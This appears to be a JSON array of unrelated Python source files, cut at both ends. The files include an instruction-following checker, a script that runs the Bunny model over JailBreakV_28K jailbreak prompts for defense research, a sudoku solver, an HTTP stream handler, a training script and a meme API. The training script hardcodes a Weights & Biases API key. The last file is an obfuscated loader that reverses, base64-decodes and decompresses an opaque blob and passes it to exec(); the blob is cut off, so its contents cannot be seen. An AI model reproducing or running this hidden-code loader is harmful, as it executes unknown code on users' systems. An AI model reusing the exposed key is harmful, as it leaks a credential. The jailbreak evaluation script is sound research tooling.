ending keywords.\n# TODO(jeffreyzhou) add more ending options\n_ENDING_OPTIONS = (\"Any other questions?\",\n                   \"Is there anything else I can help with?\")\n\n# The number of highlighted sections.\n_NUM_HIGHLIGHTED_SECTIONS = 4\n\n# The section spliter.\n_SECTION_SPLITER = (\"Section\", \"SECTION\")\n\n# The number of sections.\n_NUM_SECTIONS = 5\n\n# The number of paragraphs.\n_NUM_PARAGRAPHS = 5\n\n# The postscript marker.\n_POSTSCRIPT_MARKER = (\"P.S.\", \"P.P.S\")\n\n# The number of keywords.\n_NUM_KEYWORDS = 2\n\n# The occurrences of a single keyword.\n_KEYWORD_FREQUENCY = 3\n\n# The occurrences of a single letter.\n_LETTER_FREQUENCY = 10\n\n# The occurrences of words with all capital letters.\n_ALL_CAPITAL_WORD_FREQUENCY = 20\n\n# The number of words in the response.\n_NUM_WORDS_LOWER_LIMIT = 100\n_NUM_WORDS_UPPER_LIMIT = 500\n\n\nclass Instruction:\n  \"\"\"An instruction template.\"\"\"\n\n  def __init__(self, instruction_id):\n    self.id = instruction_id\n\n  def build_description(self, **kwargs):\n    raise NotImplementedError(\"`build_description` not implemented.\")\n\n  def get_instruction_args(self):\n    raise NotImplementedError(\"`get_instruction_args` not implemented.\")\n\n  def get_instruction_args_keys(self):\n    raise NotImplementedError(\"`get_instruction_args_keys` not implemented.\")\n\n  def check_following(self, value):\n    raise NotImplementedError(\"`check_following` not implemented.\")\n\n\nclass ResponseLanguageChecker(Instruction):\n  \"\"\"Check the language of the entire response.\"\"\"\n\n  def build_description(self, *, language = None):\n    \"\"\"Build the instruction description.\n\n    Args:\n      language: A string representing the expected language of the response. The\n        language has to comply to the 97 types defined in\n        `langid.py` (https://pypi.org/project/langid/1.1.5/), which follows\n        ISO 639-1 codes (https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes);\n        for example, `en` for English, `zh` for Chinese, `fr` for French.\n\n    Returns:\n      A string representing the instruction description.\n    \"\"\"\n    self._language = language\n    if self._language is None:\n      self._language = random.choice(list(_LANGUAGES.keys()))\n    # TODO(tianjianlu): opens the description generation to more choices.\n    self._description_pattern = (\n        \"Your ENTIRE response should be in {language} language, no other \" +\n        \"language is allowed.\")\n    return self._description_pattern.format(language=_LANGUAGES[self._language])\n\n  def get_instruction_args(self):\n    \"\"\"Returns the keyward args of `build_description`.\"\"\"\n    return {\"language\": self._language}\n\n  def get_instruction_args_keys(self):\n    \"\"\"Returns the args keys of `build_description`.\"\"\"\n    return [\"language\"]\n\n  def check_following(self, value):\n    \"\"\"Check if the language of the entire response follows the instruction.\n\n    Args:\n      value: A string representing the response.\n\n    Returns:\n      True if the language of `value` follows instruction; otherwise False.\n    \"\"\"\n    assert isinstance(value, str)\n\n    try:\n      return langdetect.detect(value) == self._language\n    except langdetect.LangDetectException as e:\n      # Count as instruction is followed.\n      logging.error(\n   ",
    "import sys, os\nimport shutil\nimport cv2\nimport argparse\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, LlamaTokenizer, AutoProcessor, AutoModel\nfrom transformers.generation import GenerationConfig\nfrom tqdm.contrib import tzip\n\nimport torch\nimport json\nimport pandas as pd\nfrom tqdm import tqdm\nfrom PIL import Image\nfrom transformers import pipeline\nfrom transformers import AutoModel, CLIPImageProcessor\nfrom transformers import InstructBlipProcessor, InstructBlipForConditionalGeneration\nimport base64\nfrom mimetypes import guess_type\nimport requests\n\n\ndef main(args):\n    # Open image folder\n\n    save_path = args.save_path\n    dataset = args.dataset\n    model_name = \"Bunny-v1_0\"\n    root = args.root\n    args.data_path = os.path.join(root,\"JailBreakV_28K.csv\")\n    os.makedirs(f\"{save_path}/{dataset}/{model_name}/\", exist_ok=True)\n    query_df = pd.read_csv(args.data_path)\n    print(\"Generating \" + f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\")\n    batch_query_text = query_df[\"jailbreak_query\"]\n    batch_image_path = [os.path.join(root, path) for path in\n                        query_df[\"image_path\"]]\n    print(\"Image loaded.\")\n    if os.path.exists(f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\"):\n        df_save = pd.read_csv(f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\")\n        batch_response = df_save[\"response\"].to_list()\n        while len(batch_response) < len(batch_image_path):\n            batch_response.append(None)\n    else:\n        df_save = query_df\n        batch_response = [None] * len(batch_image_path)\n\n    torch.set_default_device('cuda')  # or 'cuda'\n    # create model\n    model = AutoModelForCausalLM.from_pretrained(\n        'BAAI/Bunny-v1_0-3B',\n        torch_dtype=torch.float16,\n        device_map='auto',\n        trust_remote_code=True)\n    tokenizer = AutoTokenizer.from_pretrained(\n        'BAAI/Bunny-v1_0-3B',\n        trust_remote_code=True)\n\n    for index, (image_path, prompt) in enumerate(tzip(batch_image_path, batch_query_text)):\n        if pd.notna(batch_response[index]) & isinstance(batch_response[index], str):\n            if (len(batch_response[index]) > 100) & (\n                    df_save[\"jailbreak_query\"][index] == query_df[\"jailbreak_query\"][index]):\n                if not ('sorry' in batch_response[index]):\n                    continue\n        text = (f\"A chat between a curious user and an artificial intelligence assistant. The assistant gives helpful, \"\n                f\"detailed, and polite answers to the user's questions. USER: <image>\\n{prompt} ASSISTANT:\")\n        text_chunks = [tokenizer(chunk).input_ids for chunk in text.split('<image>')]\n        input_ids = torch.tensor(text_chunks[0] + [-200] + text_chunks[1], dtype=torch.long).unsqueeze(0)\n\n        # image, sample images can be found in https://huggingface.co/BAAI/Bunny-v1_0-3B/tree/main/images\n        image = Image.open(image_path)\n        image_tensor = model.process_images([image], model.config).to(dtype=model.dtype)\n\n        # generate\n        output_ids = model.generate(\n            input_ids,\n            images=image_tensor,\n            max_new_tokens=100,\n            use_cache=True)[0]\n        response = tokenizer.decode(output_ids[input_ids.shape[1]:], skip_special_tokens=True).strip()\n        batch_response[index] = response\n        if index < 5:\n            print(response)\n        query_df[\"response\"] = batch_response\n        if (index == 5) or ((index + 1) % 100 == 0):\n            print(f\"Saving{index}...\")\n            query_df.to_csv(f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\")\n    query_df[\"response\"] = batch_response\n    query_df.to_csv(f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\")\n    # Example usage\n\n    response_df = pd.read_csv(f\"{save_path}/{dataset}/{model_name}/{args.data_path.split('/')[-1]}\")\n    cnt_null = response_df['response'].isnull().sum()\n    if cnt_null:\n        print(f\"Contain {cnt_null} Null!!!\")\n        print(response_df['response'][response_df['response'].isnull()])\n    else:\n        print(f\"Done, no Nulls left.\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Experiment arguments for VLM defense\")\n    parser.add_argument('--dataset', type=str, default=\"JailBreakV_28k\")\n    parser.add_argument('--root', type=str, default=None)\n    parser.add_argument(\"--save_path\", default=\"./results/\")\n    parser.add_argument(\"--temperature\", type=float, default=0.2)\n    parser.add_argument(\"--top_p\", type=float, default=0.7)\n    parser.add_argument(\"--num_beams\", type=int, default=1)\n    parser.add_argument(\"--max_new_tokens\", type=int, default=500)\n    args = parser.parse_args()\n\n    main(args)\n",
    "import random\nimport numpy as np\nimport time\n\n\ndef generateNewSudoku(seed_=0, missingCells=16):\n    random.seed(seed_)\n\n    sudokuBoard = np.array([[4, 8, 3, 9, 2, 1, 6, 5, 7],\n                            [9, 6, 7, 3, 4, 5, 8, 2, 1],\n                            [2, 5, 1, 8, 7, 6, 4, 9, 3],\n                            [5, 4, 8, 1, 3, 2, 9, 7, 6],\n                            [7, 2, 9, 5, 6, 4, 1, 3, 8],\n                            [1, 3, 6, 7, 9, 8, 2, 4, 5],\n                            [3, 7, 2, 6, 8, 9, 5, 1, 4],\n                            [8, 1, 4, 2, 5, 3, 7, 6, 9],\n                            [6, 9, 5, 4, 1, 7, 3, 8, 2]])\n\n    shuffleTheSudoku(sudokuBoard)\n    emptyCells = deleteSomeCells(sudokuBoard, missingCells)\n    return sudokuBoard, emptyCells\n\n\ndef shuffleColumns(sudokuBoard):\n    for i in range(3):  # For each group\n        a = random.randint(i*3, i*3+2)\n        b = random.randint(i*3, i*3+2)\n        if a != b:\n            sudokuBoard[:, [a, b]] = sudokuBoard[:, [b, a]]  # Swap Cols\n\n\ndef shuffleRows(sudokuBoard):\n    # Shuffle Rows\n    for i in range(3):  # For each group\n        a = random.randint(i*3, i*3+2)\n        b = random.randint(i*3, i*3+2)\n        if a != b:\n            sudokuBoard[[a, b]] = sudokuBoard[[b, a]]  # Swap Rows\n\n\ndef shuffle3X3(sudokuBoard):\n    for i in range(3):\n        a = random.randint(0, 2)\n        b = random.randint(0, 2)\n\n        swap3X3Rows(sudokuBoard, i, a)\n        swap3X3Cols(sudokuBoard, i, b)\n\n\ndef swap3X3Rows(sudokuBoard, i,  a):\n    for i in range(3):\n        a = random.randint(i*3, i*3+2)\n        b = random.randint(i*3, i*3+2)\n        sudokuBoard[[a, b]] = sudokuBoard[[b, a]]\n\n\ndef swap3X3Cols(sudokuBoard, i,  a):\n    for i in range(3):\n        a = random.randint(i*3, i*3+2)\n        b = random.randint(i*3, i*3+2)\n        sudokuBoard[:, [a, b]] = sudokuBoard[:, [b, a]]  # Swap Cols\n\n\ndef shuffleTheSudoku(sudokuBoard):\n\n    # Do it 3 times\n    for _ in range(3):\n        shuffleRows(sudokuBoard)\n        shuffleColumns(sudokuBoard)\n        shuffle3X3(sudokuBoard)\n\n\ndef deleteSomeCells(sudokuBoard, missingCells):\n\n    arr = np.arange(81)\n    random.shuffle(arr)\n    emptyCells = arr[:missingCells]\n    for cell in emptyCells:\n        sudokuBoard[cell//9][cell % 9] = 0\n\n    return emptyCells\n\n\ndef generateSeed(sudokuBoard):\n    numbers = sudokuBoard.reshape(-1,).astype(str).tolist()\n    seed = int(\"\".join(numbers))\n    return str(seed)\n\n\ndef isCorrectCell(sudokuBoard, i, j, number):\n\n    if number > 9 or number < 0:\n        return False\n\n    # Check same row and cols in one for loop\n    for rc in range(9):\n        if (j != rc and number == sudokuBoard[i, rc]):\n            return False\n        if (i != rc and number == sudokuBoard[rc, j]):\n            return False\n\n    block_i, block_j = i//3, j // 3\n    for r in range(3):\n        for c in range(3):\n            if ((i != r + block_i * 3 and j != c + block_j * 3) and number == sudokuBoard[r + block_i * 3, c + block_j * 3]):\n                return False\n\n    return True\n\n\ndef solveSudoku(sudokuBoard, emptyCells):\n\n    if not len(emptyCells):\n        return\n\n    cell = emptyCells[0]\n    # print(SUDOKU_BOARD)\n    for number in range(1, 10):\n        if isCorrectCell(sudokuBoard, cell//9, cell % 9, number):\n            sudokuBoard[cell//9, cell % 9] = number\n            solveSudoku(sudokuBoard, emptyCells[1:])\n\n    return sudokuBoard\n\n\ndef verifySudoku(sudokuBoard):\n    for i in range(9):\n        for j in range(9):\n            if not isCorrectCell(sudokuBoard, i, j, sudokuBoard[i, j]):\n                return False\n    return True\n\n\nif __name__ == \"__main__\":\n\n    TestSize = 10_000\n    seeds = list(range(TestSize))\n\n    sudoku, emptyCells = generateNewSudoku(\n        seed_=0, missingCells=0)\n\n    print(sudoku)\n    print(generateSeed(sudoku))\n    input()\n\n    initTimes = []\n    solveTimes = []\n    verifyTimes = []\n\n    for missingCell in [1, 10, 20, 30, 40, 50, 60]:\n        print(\"Level\", missingCell)\n\n        for s in seeds:\n            # Setting up the puzzle\n            istart = time.perf_counter()\n            sudoku, emptyCells = generateNewSudoku(\n                seed_=s, missingCells=missingCell)\n            iend = time.perf_counter()\n            initTimes.append(iend-istart)\n\n            # Solving the puzzle\n            sstart = time.perf_counter()\n            sudoku = solveSudoku(sudoku, emptyCells)\n            send = time.perf_counter()\n            solveTimes.append(send-sstart)\n\n            # Verifying the puzzle\n            vstart = time.perf_counter()\n            verifySudoku(sudoku)\n            vend = time.perf_counter()\n            verifyTimes.append(vend-vstart)\n\n            #print(\"Seed:\", generateSeed(sudoku))\n\n        print(\"Init:\", sum(initTimes)/TestSize)\n        print(\"Solve:\", sum(solveTimes)/TestSize)\n        print(\"Verify:\", sum(verifyTimes)/TestSize)\n        print(\"Solve/Verify Time Ratio:\", sum(solveTimes) / sum(verifyTimes))\n\n        initTimes = []\n        solveTimes = []\n        verifyTimes = []",
    "\n\nclass StatValue:\n    def __init__(self):\n        self.clear()\n\n    def reset(self):\n        self.val = 0\n\n    def clear(self):\n        self.reset()\n        self.history = []\n\n    def update(self, val):\n        self.val = val\n        self.history.append(self.val)\n\n\nclass AverageMeter(object):\n    \"\"\"Computes and stores the average and current value\"\"\"\n    def __init__(self):\n        self.clear()\n        self.has_new_data = False\n\n    def reset(self):\n        self.avg = 0\n        self.val = 0\n        self.sum = 0\n        self.count = 0\n\n    def clear(self):\n        self.reset()\n        self.history = []\n\n    def update(self, val, n=1):\n        self.val = val\n        self.sum += val * n\n        self.count += n\n        self.avg = self.sum / self.count\n\n    def new_epoch(self):\n        if self.count > 0:\n            self.history.append(self.avg)\n            self.reset()\n            self.has_new_data = True\n        else:\n            self.has_new_data = False\n\n\ndef topk_accuracy(output, target, topk=(1,)):\n    \"\"\"Computes the precision@k for the specified values of k\"\"\"\n    single_input = not isinstance(topk, (tuple, list))\n    if single_input:\n        topk = (topk,)\n\n    maxk = max(topk)\n    batch_size = target.size(0)\n\n    _, pred = output.topk(maxk, 1, True, True)\n    pred = pred.t()\n    correct = pred.eq(target.view(1, -1).expand_as(pred))\n\n    res = []\n    for k in topk:\n        correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)[0]\n        res.append(correct_k * 100.0 / batch_size)\n\n    if single_input:\n        return res[0]\n\n    return res\n",
    "from __future__ import annotations\n\nfrom enum import Enum, auto\nfrom time import time\nfrom typing import Awaitable, Callable\nfrom urllib.parse import unquote\n\nfrom ..config import Config\nfrom ..typing import (\n    AppWrapper,\n    ASGISendEvent,\n    HTTPResponseStartEvent,\n    HTTPScope,\n    TaskGroup,\n    WorkerContext,\n)\nfrom ..utils import (\n    UnexpectedMessageError,\n    build_and_validate_headers,\n    suppress_body,\n    valid_server_name,\n)\nfrom .events import Body, EndBody, Event, InformationalResponse, Request, Response, StreamClosed\n\nPUSH_VERSIONS = {\"2\", \"3\"}\nEARLY_HINTS_VERSIONS = {\"2\", \"3\"}\n\n\nclass ASGIHTTPState(Enum):\n    # The ASGI Spec is clear that a response should not start till the\n    # framework has sent at least one body message hence why this\n    # state tracking is required.\n    REQUEST = auto()\n    RESPONSE = auto()\n    CLOSED = auto()\n\n\nclass HTTPStream:\n    def __init__(\n        self,\n        app: AppWrapper,\n        config: Config,\n        context: WorkerContext,\n        task_group: TaskGroup,\n        ssl: bool,\n        client: tuple[str, int] | None,\n        server: tuple[str, int] | None,\n        send: Callable[[Event], Awaitable[None]],\n        stream_id: int,\n    ) -> None:\n        self.app = app\n        self.client = client\n        self.closed = False\n        self.config = config\n        self.context = context\n        self.response: HTTPResponseStartEvent\n        self.scope: HTTPScope\n        self.send = send\n        self.scheme = \"https\" if ssl else \"http\"\n        self.server = server\n        self.start_time: float\n        self.state = ASGIHTTPState.REQUEST\n        self.stream_id = stream_id\n        self.task_group = task_group\n\n    @property\n    def idle(self) -> bool:\n        return False\n\n    async def handle(self, event: Event) -> None:\n        if self.closed:\n            return\n        elif isinstance(event, Request):\n            self.start_time = time()\n            path, _, query_string = event.raw_path.partition(b\"?\")\n            self.scope = {\n                \"type\": \"http\",\n                \"http_version\": event.http_version,\n                \"asgi\": {\"spec_version\": \"2.1\", \"version\": \"3.0\"},\n                \"method\": event.method,\n                \"scheme\": self.scheme,\n                \"path\": unquote(path.decode(\"ascii\")),\n                \"raw_path\": path,\n                \"query_string\": query_string,\n                \"root_path\": self.config.root_path,\n                \"headers\": event.headers,\n                \"client\": self.client,\n                \"server\": self.server,\n                \"extensions\": {},\n            }\n            if event.http_version in PUSH_VERSIONS:\n                self.scope[\"extensions\"][\"http.response.push\"] = {}\n\n            if event.http_version in EARLY_HINTS_VERSIONS:\n                self.scope[\"extensions\"][\"http.response.early_hint\"] = {}\n\n            if valid_server_name(self.config, event):\n                self.app_put = await self.task_group.spawn_app(\n                    self.app, self.config, self.scope, self.app_send\n                )\n            else:\n                await self._send_error_response(404)\n                self.closed = True\n\n        elif isinstance(event, Body):\n            await self.app_put(\n                {\"type\": \"http.request\", \"body\": bytes(event.data), \"more_body\": True}\n            )\n        elif isinstance(event, EndBody):\n            await self.app_put({\"type\": \"http.request\", \"body\": b\"\", \"more_body\": False})\n        elif isinstance(event, StreamClosed):\n            self.closed = True\n            if self.state != ASGIHTTPState.CLOSED:\n                await self.config.log.access(self.scope, None, time() - self.start_time)\n            if self.app_put is not None:\n                await self.app_put({\"type\": \"http.disconnect\"})\n\n    async def app_send(self, message: ASGISendEvent | None) -> None:\n        if message is None:  # ASGI App has finished sending messages\n            if not self.closed:\n                # Cleanup if required\n                if self.state == ASGIHTTPState.REQUEST:\n                    await self._send_error_response(500)\n                await self.send(StreamClosed(stream_id=self.stream_id))\n        else:\n            if message[\"type\"] == \"http.response.start\" and self.state == ASGIHTTPState.REQUEST:\n                self.response = message\n            elif (\n                message[\"type\"] == \"http.response.push\"\n                and self.scope[\"http_version\"] in PUSH_VERSIONS\n            ):\n                if not isinstance(message[\"path\"], str):\n                    raise TypeError(f\"{message['path']} should be a str\")\n                headers = [(b\":scheme\", self.scope[\"scheme\"].encode())]\n                for name, value in self.scope[\"headers\"]:\n                    if name == b\"host\":\n                        headers.append((b\":authority\", value))\n                headers.extend(build_and_validate_headers(message[\"headers\"]))\n                await self.send(\n                    Request(\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n# All rights reserved.\n#\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\nimport os\nimport json\nimport time\nimport sys\nimport torch\nimport transformers\nimport numpy as np\nfrom pathlib import Path\nfrom torch.utils.data import DataLoader, RandomSampler, DistributedSampler, SequentialSampler\nfrom src.options import Options\nfrom tqdm import tqdm\n\nimport src.slurm\nimport src.util\nimport src.evaluation\nimport src.data\nimport src.model\nfrom src.ResultTable import ResultTable\n\nfrom scipy.sparse import csc_matrix\nfrom torch.nn import CrossEntropyLoss\nimport torch.nn.functional as F\n\nimport wandb\nos.environ['WANDB_API_KEY'] = \"01e2c25c291441f9d7a138a24249bd2b5e39eb8f\"\n\nfrom sklearn import metrics\n\ndef train(model, optimizer, scheduler, checkpoint_step, train_dataset, eval_dataset, opt, collator, best_dev_em, checkpoint_path):\n    if opt.is_main:\n        try:\n            tb_logger = torch.utils.tensorboard.SummaryWriter(Path(opt.checkpoint_dir)/opt.name)\n        except:\n            tb_logger = None\n\n    torch.manual_seed(opt.global_rank + opt.seed) #different seed for different sampling depending on global_rank\n    train_sampler = RandomSampler(train_dataset)\n    train_dataloader = DataLoader(\n        train_dataset,\n        sampler=train_sampler,\n        batch_size=opt.per_gpu_batch_size,\n        drop_last=True,\n        num_workers=opt.num_workers,\n        collate_fn=collator\n    )\n    step = 0\n    loss, curr_loss = 0.0, 0.0\n    epoch = 1\n    model.train()\n    pbar = tqdm(total=opt.total_steps, desc=f\"> training\", dynamic_ncols=True)\n\n    while step < opt.total_steps + 1:\n        epoch += 1\n        for i, batch in enumerate(train_dataloader):\n            step += 1\n            pbar.update(1)\n            if step <= checkpoint_step:\n                continue\n            (idx, labels, context_ids, context_mask, q_tokens, has_answers, sentence_spans_, has_answers_sent_) = batch\n\n            outputs = model(\n                input_ids=context_ids.cuda(),\n                attention_mask=context_mask.cuda(),\n                labels=labels.cuda(),\n                q_tokens=q_tokens,\n                has_answers=has_answers,\n                sentence_spans=sentence_spans_,\n                has_answers_sent=has_answers_sent_,\n                output_attentions=True,\n                step=step,\n            )\n            train_loss = outputs[0]\n            \n            pred_loss = None\n            if opt.pointwise is not None:\n                if opt.pointwise == 'v1':\n                    # v1\n                    col_indices = torch.where((labels!=-100))\n                    cols = labels[col_indices]\n                    logits = outputs.enc_pred_embs[col_indices] @ model.shared.weight.T\n                    loss_fct = CrossEntropyLoss()\n                    pred_loss = loss_fct(logits, cols.to(logits.device))\n                # v2\n                elif opt.pointwise == 'v2':\n                    col_indices = torch.where((labels!=-100) & (labels!=1))\n                    cols = labels[col_indices]\n                    vals = torch.ones_like(cols).flatten()\n                    rows_temp = torch.arange(labels.shape[0]).repeat_interleave(labels.shape[1]).view(labels.shape[0], -1) \n                    rows = rows_temp[col_indices]\n                    label_matrix = csc_matrix((vals, (rows, cols)), shape=(labels.shape[0], model.shared.num_embeddings))\n                    \n                    logits = (outputs.enc_pred_embs @ model.shared.weight.T).max(1)[0]\n                    logits = -(F.softmax(logits, dim=-1)+1e-10).log()\n                    label_matrix = torch.Tensor(label_matrix.toarray()).to(logits.device)\n                    pred_loss = (label_matrix * logits).sum(dim=1).mean()                    \n                train_loss = train_loss + opt.lamb * pred_loss\n            \n            if torch.isnan(train_loss):\n                print(step)\n                from IPython import embed; embed()\n\n            train_loss = train_loss / opt.accumulation_steps\n            if step % opt.print_freq == 0:\n                print(train_loss)\n\n            train_loss.backward()\n            if step % opt.accumulation_steps == 0:\n                torch.nn.utils.clip_grad_norm_(model.parameters(), opt.clip)\n                optimizer.step()\n                scheduler.step()\n                model.zero_grad()\n\n            train_loss = src.util.average_main(train_loss, opt)\n\n            if pred_loss is not None:  \n                wandb_log = {\"step\": step, \"train_loss\": train_loss.item(), \"pred_loss\": pred_loss.item(),\n                         \"lr\": scheduler.get_last_lr()[0]}\n            else:\n                wandb_log = {\"step\": step, \"train_loss\": train_loss.item(),\n                             \"lr\": scheduler.get_last_lr()[0]}\n\n            curr_loss += train_loss.item()\n\n            if step >= opt.eval_from and step % opt.eval_freq == 0:\n          ",
    "from typing import Annotated\nimport json\nimport random\n\nfrom fastapi import FastAPI, HTTPException, Query\nfrom pydantic import BaseModel\n\n# Description for the docs\nDESCRIPTION = \"\"\"\nThis API provides a collection of hilarious programming memes to lighten up your coding sessions.\n\n## Api\nYou can tailor the humor to fit your preferences by filtering memes based on dimensions.\nYou can select the:\n* **max_width**: between 193 to 2560.\n* **min_width**: between 193 to 2560.\n* **max_height**: between 101 to 2560.\n* **min_height**: between 101 to 2560.\n\"\"\"\n\n#Summary for the docs\nSUMMARY = \"\"\"\nWhether you're integrating memes into your application or just browsing for a chuckle, this API provides an entertaining solution for programmers of all levels.\n\"\"\"\n\napp = FastAPI(\n    title=\"Programming Meme API\",\n    description=DESCRIPTION,\n    summary=SUMMARY,\n    version=\"0.0.1\",\n    contact={\n        \"name\": \"Lakhindar Pal\",\n        \"url\": \"https://lakhindar.is-a-good.dev\"\n    },\n    license_info={\n        \"name\": \"MIT\",\n        \"url\": \"https://github.com/LakhindarPal/programming-meme-api/blob/main/LICENSE\",\n        \"identifier\": \"MIT\"\n    }\n)\n\n# Response model\nclass Meme(BaseModel):\n    id: str\n    url: str\n    width: int\n    height: int\n\n# Base URL for memes\nCDN_BASE = \"https://raw.githubusercontent.com/deep5050/programming-memes/main\"\n\n# Load memes from a local JSON file\ntry:\n    with open(\"data.json\", \"r\", encoding=\"utf-8\") as file:\n        memes = json.load(file)\nexcept FileNotFoundError as exc:\n    raise Exception(\"Memes file not found. Please make sure 'memes.json' exists in the specified directory.\") from exc\nexcept json.JSONDecodeError as exc:\n    raise Exception(\"Error parsing JSON. Please check if 'memes.json' contains valid JSON data.\") from exc\n\n# Test route \n@app.get(\"/\")\nasync def root():\n    return {\"message\": \"Hello World\"}\n\n#  route\n@app.get(\"/api\")\nasync def random_meme(\n    max_width: Annotated[int | None, Query(ge=193, le=2560)] = None,\n    min_width: Annotated[int | None, Query(ge=193, le=2560)] = None,\n    max_height: Annotated[int | None, Query(ge=101, le=2560)] = None,\n    min_height: Annotated[int | None, Query(ge=101, le=2560)] = None\n) -> Meme:\n    filtered_memes = [meme for meme in memes\n                      if (max_width is None or meme[\"width\"] <= max_width)\n                      and (min_width is None or meme[\"width\"] >= min_width)\n                      and (max_height is None or meme[\"height\"] <= max_height)\n                      and (min_height is None or meme[\"height\"] >= min_height)]\n\n    if not filtered_memes:\n        raise HTTPException(status_code=404, detail=\"No meme is found matching the criteria.\")\n\n    random_meme = random.choice(filtered_memes)\n    return Meme(\n        id=random_meme[\"id\"],\n        url=f\"{CDN_BASE}/{random_meme['path']}\",\n        width=random_meme[\"width\"],\n        height=random_meme[\"height\"]\n    )\n",
    "\n# Create by Mr. Pstar7 \n                    \n_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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